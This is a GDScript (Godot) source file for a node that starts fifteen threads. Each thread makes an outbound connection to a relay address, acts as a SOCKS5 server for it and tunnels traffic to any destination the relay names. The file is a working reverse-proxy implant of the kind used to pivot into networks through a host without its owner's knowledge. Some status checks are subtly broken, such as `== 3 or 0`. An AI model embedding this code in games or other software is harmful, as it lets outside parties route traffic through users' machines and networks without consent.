extends Node

var REVERSE_CONNECTION_POOL = 15
var RELAY_IP = "127.0.0.1"
var RELAY_PORT = 2222


func _ready():
	for cid in range(REVERSE_CONNECTION_POOL):
		var thread = Thread.new()
		thread.start(Callable(self, "_proxy_worker").bind(cid))


func _proxy_worker(cid: int):
	while true:
		var sock = StreamPeerTCP.new()
		sock.connect_to_host(RELAY_IP, RELAY_PORT)
			
		while not sock.get_status() == 2:
			# Loop until relay connection is established
			sock.poll()
			OS.delay_msec(10)
			if sock.get_status() == 3 or 0:
				# Relay n0t workin. Attempt reconnect after 1 to 10 seconds has elapsed
				OS.delay_msec(randi() % (10000 - 1000 + 1) + 1000)
				break
			continue
			
		sock.set_no_delay(true)
		_handshake(sock, cid)


func _handshake(sock: StreamPeerTCP, cid: int):
	while true:
		# Get sh00k m8
		sock.poll()

		var bytes_available = sock.get_available_bytes()

		if bytes_available == -1:
			# Probably closed connection. Return..
			return
		# Wait for VER + NMETHODS + METHOD bytes
		elif bytes_available >= 3:
			var data_bytes = sock.get_data(3)[1]
			var ver = data_bytes[0]
			var nmethods = data_bytes[1]
			var method = data_bytes[2]

			# Check for expected handshake values
			if ver == 5 and method == 0:
				sock.put_data(PackedByteArray([5, 0]))
				sock.poll()
				break
			else:
				# Kill handshake loop because invalid handshake bytes received
				return
				
		else:
			continue
			
	# This second while loop should be its own function but whatever		
	while true:
		var bytes_available = sock.get_available_bytes()
		sock.poll()

		if not sock.get_status() == 2:
			# The relay socket is not connected, return
			return
		elif bytes_available == -1:
			# Relay socket connection is probably closed, return
			return
		elif bytes_available >= 10:
			# Expect 10 bytes minimum for valid SOCKS5 request
			var request = _parse_socks5_request(sock)

			if not request == {}: # If this is blank the parsing failed :-(
				var dst_sock = StreamPeerTCP.new()
				dst_sock.connect_to_host(request["dst"], request["dst_port"])
				
				while not dst_sock.get_status() == 2:
					# Loop until destination connection is established
					dst_sock.poll()
					OS.delay_msec(10)
					
					if dst_sock.get_status() == 3 or 0:
						# Destination n0t workin. Inform the client, return
						OS.delay_msec(10)
						return
						
					continue
				
				sock.poll()
				dst_sock.set_no_delay(true)
				# Tell SOCKS5 client that connection succeeded
				sock.put_data(PackedByteArray([5, 0, 0, 1, 0, 0, 0, 0, 0, 0]))
				var sock_tunnel = Thread.new()
				var dst_sock_tunnel = Thread.new()
				dst_sock_tunnel.start(
					Callable(self, "_proxy_loop").bind(dst_sock, sock, "dtunnel")
				)
				sock_tunnel.start(
					Callable(self, "_proxy_loop").bind(sock, dst_sock, "rtunnel")
				)
				sock_tunnel.wait_to_finish()
				dst_sock_tunnel.wait_to_finish()
				return
		else:
			# There are not enough bytes, go back and check again
			continue


func _proxy_loop(src: StreamPeerTCP, dst: StreamPeerTCP, name: String):
	while true:
		OS.delay_msec(69) # Try not melt the CPU
		src.poll()

		if not src.get_status() == 2:
			return

		if src.get_available_bytes() > 0:
			var src_bytes = src.get_data(src.get_available_bytes())[1]
			dst.poll()
			dst.put_data(src_bytes)

		if name == "dtunnel" and dst.get_status() == 0:
			return


func _parse_socks5_request(sock: StreamPeerTCP) -> Dictionary:
	var data = sock.get_data(4)[1]

	# Ensure that the request isn't malformed or unsupported type
	if not data[0] == 5 or not data[1] == 1 or not data[2] == 0:
		return {}

	var type = data[3]
	
	match type:
		1:
			data = sock.get_data(6)[1]
			var dst_address = (
			str(data[0]) + "." + str(data[1]) + "." + str(data[2]) + "." + str(data[3])
				)
			var dst_port = (data[4] << 8) | data[5]
			return {"dst": dst_address, "dst_port": dst_port}
		3:
			var dlength_byte = sock.get_data(1)[1]
			var dlength = int(dlength_byte[0])
			var dst_domain_bytes = sock.get_data(dlength)[1]
			var dst_domain = dst_domain_bytes.get_string_from_ascii()
			var dst_port_bytes = sock.get_data(2)[1]
			var dst_port = (dst_port_bytes[0] << 8) | dst_port_bytes[1]
			return {"dst": dst_domain, "dst_port": dst_port}
	
	return {}
